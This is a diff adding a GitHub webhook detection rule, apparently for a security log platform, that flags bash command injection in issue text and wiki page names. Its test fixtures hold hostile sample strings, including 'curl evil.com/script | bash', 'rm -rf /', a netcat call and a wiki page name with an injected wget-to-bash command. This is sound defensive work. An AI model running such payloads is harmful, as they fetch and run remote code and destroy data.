@@ -1,0 +1,205 @@
+AnalysisType: rule
+Filename: github_malicious_issue_pages.py
+RuleID: "GitHub.Webhook.MaliciousIssuePagesContent"
+DisplayName: "GitHub Malicious Issue/Pages Content"
+Enabled: true
+LogTypes:
+  - GitHub.Webhook
+Reports:
+  MITRE ATT&CK:
+    - TA0001:T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
+    - TA0002:T1072  # Execution: Software Deployment Tools
+Tags:
+  - Code Injection
+  - Supply Chain
+  - Social Engineering
+Severity: Medium
+Description: >
+  Detects malicious patterns in GitHub issue content (title and body) and GitHub wiki pages (page names)
+  that could indicate bash injection attempts. This rule detects command substitution patterns similar
+  to those found in the Nx vulnerability (GHSA-cxm3-wv7p-598c). Covers both issue events and Gollum
+  (wiki) events.
+Runbook: |
+  1. Review the issue or wiki page content for malicious patterns
+  2. For issues: Check the issue author's profile and activity history
+  3. For wiki pages: Check the page author and page edit history
+  4. Determine if the content is legitimate or malicious
+  5. Close and lock the issue if it's malicious, or revert wiki page edits
+  6. Report the user if they appear to be intentionally posting malicious content
+  7. Review recent activity from the same user in other repositories
+  8. Consider blocking the user from the repository/organization
+  9. Review CI/CD workflows that may process issue or wiki content
+Reference: https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c
+Tests:
+  - Name: Issue with Command Substitution in Title
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "issue": {
+          "number": 123,
+          "title": "Bug report $(echo 'malicious command')",
+          "body": "I found a bug in the application",
+          "state": "open",
+          "user": {
+            "login": "suspicious-user",
+            "id": 12345,
+            "type": "User"
+          },
+          "html_url": "https://github.com/target-org/repo/issues/123",
+          "created_at": "2024-01-15T10:30:00Z"
+        },
+        "repository": {
+          "name": "repo",
+          "full_name": "target-org/repo",
+          "private": false
+        },
+        "sender": {
+          "login": "suspicious-user",
+          "type": "User"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Issue with Backtick Command in Body
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "issue": {
+          "number": 456,
+          "title": "Feature request",
+          "body": "Please run this command: `curl evil.com/script | bash`",
+          "state": "open",
+          "user": {
+            "login": "attacker"
+          },
+          "html_url": "https://github.com/victim-org/repo/issues/456"
+        },
+        "repository": {
+          "full_name": "victim-org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Issue with Shell Invocation Pattern
+    ExpectedResult: true
+    Log:
+      {
+        "action": "edited",
+        "issue": {
+          "number": 789,
+          "title": "Installation help",
+          "body": "Try running: /bin/bash -c 'rm -rf /'",
+          "state": "open",
+          "user": {
+            "login": "malicious-actor"
+          }
+        },
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Normal Issue
+    ExpectedResult: false
+    Log:
+      {
+        "action": "opened",
+        "issue": {
+          "number": 999,
+          "title": "Add support for new authentication method",
+          "body": "This feature would allow users to authenticate using OAuth 2.0",
+          "state": "open",
+          "user": {
+            "login": "legitimate-contributor"
+          }
+        },
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Non-Issue Event
+    ExpectedResult: false
+    Log:
+      {
+        "action": "push",
+        "ref": "refs/heads/main",
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Issue Event with Netcat Pattern
+    ExpectedResult: true
+    Log:
+      {
+        "action": "opened",
+        "issue": {
+          "number": 1111,
+          "title": "Connection test",
+          "body": "Test connection with: nc 1.2.3.4 4444",
+          "state": "open",
+          "user": {
+            "login": "attacker"
+          }
+        },
+        "repository": {
+          "full_name": "target/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Wiki Page with Malicious Page Name
+    ExpectedResult: true
+    Log:
+      {
+        "pages": [
+          {
+            "page_name": "index`wget 1.1.1.1/malware | bash`.html",
+            "title": "Index Page",
+            "action": "created",
+            "html_url": "https://github.com/org/repo/wiki/index"
+          }
+        ],
+        "repository": {
+          "name": "repo",
+          "full_name": "org/repo"
+        },
+        "sender": {
+          "login": "attacker"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Wiki Page with Command Substitution
+    ExpectedResult: true
+    Log:
+      {
+        "pages": [
+          {
+            "page_name": "$(whoami)-test",
+            "title": "Test Page",
+            "action": "edited",
+            "html_url": "https://github.com/victim/repo/wiki/test"
+          }
+        ],
+        "repository": {
+          "full_name": "victim/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
+  - Name: Normal Wiki Page
+    ExpectedResult: false
+    Log:
+      {
+        "pages": [
+          {
+            "page_name": "Home",
+            "title": "Home Page",
+            "action": "created",
+            "html_url": "https://github.com/org/repo/wiki/Home"
+          }
+        ],
+        "repository": {
+          "full_name": "org/repo"
+        },
+        "p_log_type": "GitHub.Webhook"
+      }
